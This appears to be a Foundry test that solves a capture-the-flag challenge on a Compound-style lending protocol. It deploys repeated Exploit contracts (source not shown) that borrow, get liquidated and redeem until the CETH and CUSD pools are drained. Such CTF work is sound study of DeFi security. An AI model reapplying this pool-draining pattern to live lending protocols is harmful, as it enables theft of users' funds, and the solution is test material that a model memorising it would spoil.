// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/challenge/Challenge.sol";
import "../src/Exploit.sol";

contract Solve is Test {
    Challenge public chall;

    AppworksToken public CUSD;
    AppworksToken public CStUSD;
    AppworksToken public CETH;
    AppworksToken public CWETH;

    CErc20Immutable public CCUSD;
    CErc20Immutable public CCStUSD;
    CErc20Immutable public CCETH;
    CErc20Immutable public CCWETH;

    Comptroller public comptroller;

    uint256 seed;
    address target;
    Deployer dd;

    function setUp() public {
        seed = 2023_12_18;
        target = address(uint160(seed));
        dd = new Deployer();

        chall = new Challenge();
        chall.init(seed, address(this), address(dd));

        CUSD = chall.CUSD();
        CStUSD = chall.CStUSD();
        CETH = chall.CETH();
        CWETH = chall.CWETH();

        CCUSD = chall.CCUSD();
        CCStUSD = chall.CCStUSD();
        CCETH = chall.CCETH();
        CCWETH = chall.CCWETH();

        comptroller = chall.comptroller();
    }

    function testSolve() public {
        /* Solve here */
        Exploit drainCETH1 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);

        // 一開始有 1e22 的 CWETH 轉到 Exploit 讓他可以 mint CToken
        CWETH.transfer(address(drainCETH1), CWETH.balanceOf(address(this)));

        // 執行 Exploit 的 drain function 後，會把 CWETH 轉回來，同時可以被清算
        drainCETH1.drain();

        // 開始清算
        CETH.approve(address(CCETH), type(uint256).max);

        CCETH.liquidateBorrow(address(drainCETH1), 1, CTokenInterface(CCWETH));

        CCWETH.redeem(1);

        // 重複步驟把 CETH 借光
        Exploit drainCETH2 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);

        CWETH.transfer(address(drainCETH2), CWETH.balanceOf(address(this)));

        drainCETH2.drain();

        CCETH.liquidateBorrow(address(drainCETH2), 1, CTokenInterface(CCWETH));

        CCWETH.redeem(1);

        Exploit drainCETH3 = new Exploit(address(CCETH), address(CETH), address(chall), 3000 ether);

        CWETH.transfer(address(drainCETH3), CWETH.balanceOf(address(this)));

        drainCETH3.drain();

        CCETH.liquidateBorrow(address(drainCETH3), 1, CTokenInterface(CCWETH));

        CCWETH.redeem(1);

        // 用一樣方法把 CUSD 借光
        Exploit drainCUSD = new Exploit(address(CCUSD), address(CUSD), address(chall), 10000 ether);

        CWETH.transfer(address(drainCUSD), CWETH.balanceOf(address(this)));

        drainCUSD.drain();

        CUSD.approve(address(CCUSD), type(uint256).max);

        CCUSD.liquidateBorrow(address(drainCUSD), 200, CTokenInterface(CCWETH));

        CCWETH.redeem(1);

        // 最後把賺來的錢和一開始的 CWETH 都轉到 target 地址
        CUSD.transfer(target, CUSD.balanceOf(address(this)));

        CETH.transfer(target, CETH.balanceOf(address(this)));

        CWETH.transfer(target, CWETH.balanceOf(address(this)));

        assertEq(chall.isSolved(), true);
    }
}
